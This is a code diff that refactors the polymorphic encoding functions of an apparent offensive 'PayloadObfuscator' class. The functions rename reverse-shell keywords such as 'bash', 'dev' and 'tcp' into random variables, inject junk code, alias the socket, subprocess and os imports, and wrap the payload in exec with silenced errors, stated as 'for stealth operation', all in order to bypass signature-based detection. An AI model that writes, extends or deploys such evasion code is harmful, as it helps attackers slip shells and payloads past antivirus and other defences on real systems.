@@ -593,81 +593,79 @@ class PayloadObfuscator:
         Advanced Polymorphic Encoding Engine.
         Changes code structure every time to bypass signature-based detection.
         """
-        import random
-        import string
-
-        def random_var(length=5):
-            return ''.join(random.choices(string.ascii_lowercase, k=length))
-
         if language == "bash":
-            # 1. Decomposition: Split command into chars and mix variables
-            var_map = {}
-            parts = []
-            
-            # Create random variables for critical keywords
-            keywords = ["bash", "dev", "tcp", "sh"]
-            repo = []
-            
-            for word in keywords:
-                if word in payload:
-                    vname = random_var()
-                    var_map[word] = vname
-                    repo.append(f"{vname}='{word}'")
-            
-            # Reassemble with variable references
-            mutated = payload
-            for k, v in var_map.items():
-                mutated = mutated.replace(k, f"${v}")
-            
-            # 2. Junk Code Injection (Logic Preserving)
-            junk_ops = [
-                "true", 
-                ":", 
-                f"{random_var()}={random.randint(1,99)}",
-                "if [ 1 -eq 1 ]; then :; fi"
-            ]
-            
-            final_code = []
-            final_code.extend(repo)
-            final_code.append(random.choice(junk_ops))
-            final_code.append(mutated)
-            
-            return "; ".join(final_code)
-
+            return _polymorphic_encode_bash(payload)
         elif language == "python":
-            # Python AST-level mutation simulation
-            imports = ["socket", "subprocess", "os"]
-            
-            # Random alias for imports
-            import_block = []
-            alias_map = {}
-            for imp in imports:
-                alias = random_var(3)
-                alias_map[imp] = alias
-                import_block.append(f"import {imp} as {alias}")
-            
-            mutated = payload
-            for org, alias in alias_map.items():
-                mutated = mutated.replace(org, alias)
-            
-            # String fragmentation
-            def fragment_string(s):
-                if len(s) < 5: return f"'{s}'"
-                cut = random.randint(1, len(s)-1)
-                return f"'{s[:cut]}'+'{s[cut:]}'"
+            return _polymorphic_encode_python(payload)
+        return payload  # Fallback for unknown langs
 
-            # Reconstruct with proper exception handling
-            # Note: Using Exception instead of bare except for better Python compatibility
-            wrapper = f"""
+def _polymorphic_encode_bash(payload: str) -> str:
+    """Polymorphic encoding for bash"""
+    import random
+    import string
+    
+    def random_var(length=5):
+        return ''.join(random.choices(string.ascii_lowercase, k=length))
+    
+    var_map = {}
+    keywords = ["bash", "dev", "tcp", "sh"]
+    repo = []
+    
+    for word in keywords:
+        if word in payload:
+            vname = random_var()
+            var_map[word] = vname
+            repo.append(f"{vname}='{word}'")
+    
+    mutated = payload
+    for k, v in var_map.items():
+        mutated = mutated.replace(k, f"${v}")
+    
+    junk_ops = [
+        "true", 
+        ":", 
+        f"{random_var()}={random.randint(1,99)}",
+        "if [ 1 -eq 1 ]; then :; fi"
+    ]
+    
+    final_code = repo + [random.choice(junk_ops), mutated]
+    return "; ".join(final_code)
+
+def _polymorphic_encode_python(payload: str) -> str:
+    """Polymorphic encoding for Python"""
+    import random
+    import string
+    
+    def random_var(length=5):
+        return ''.join(random.choices(string.ascii_lowercase, k=length))
+    
+    imports = ["socket", "subprocess", "os"]
+    import_block = []
+    alias_map = {}
+    
+    for imp in imports:
+        alias = random_var(3)
+        alias_map[imp] = alias
+        import_block.append(f"import {imp} as {alias}")
+    
+    mutated = payload
+    for org, alias in alias_map.items():
+        mutated = mutated.replace(org, alias)
+    
+    def fragment_string(s):
+        if len(s) < 5:
+            return f"'{s}'"
+        cut = random.randint(1, len(s)-1)
+        return f"'{s[:cut]}'+'{s[cut:]}'"
+    
+    wrapper = f"""
 try:
     {";".join(import_block)}
     exec({fragment_string(mutated)})
-except Exception:
+except (SyntaxError, NameError, ValueError) as e:
     pass  # Silent fail for stealth operation
 """
-            return wrapper.strip()
-
-        return payload  # Fallback for unknown langs
+    return wrapper.strip()
     
 
 
